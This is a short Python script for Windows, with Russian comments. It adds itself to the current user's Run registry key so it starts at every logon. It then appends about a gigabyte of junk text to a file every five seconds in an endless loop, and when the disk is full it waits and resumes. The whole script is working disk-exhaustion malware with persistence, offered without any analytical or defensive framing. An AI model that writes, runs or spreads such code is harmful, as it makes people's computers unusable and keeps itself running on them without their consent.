import os, webbrowser , ctypes,random,winreg,sys,time
script_path = os.path.abspath(sys.argv[0])
key = winreg.OpenKey(
    winreg.HKEY_CURRENT_USER,
    r"Software\Microsoft\Windows\CurrentVersion\Run",
    0,
    winreg.KEY_SET_VALUE
)

winreg.SetValueEx(key, "MyPythonScript", 0, winreg.REG_SZ, f'python "{script_path}"')
winreg.CloseKey(key)
i = 0
print('Process started!')
file = open('exec.txt', 'w')
file.write('aw')
file.close
def crash():
    while True:
        try:
            time.sleep(5)
            file = open('exec.txt', 'a+')
            file.write('aaaaaa....'*107374000+str(random.randint(10,99)))
            file.close
        except OSError as e:
            if e.errno == 28:  # нет места на диске
                file.close()
                print("Диск заполнен, жду освобождения места...")
                time.sleep(10)
crash()
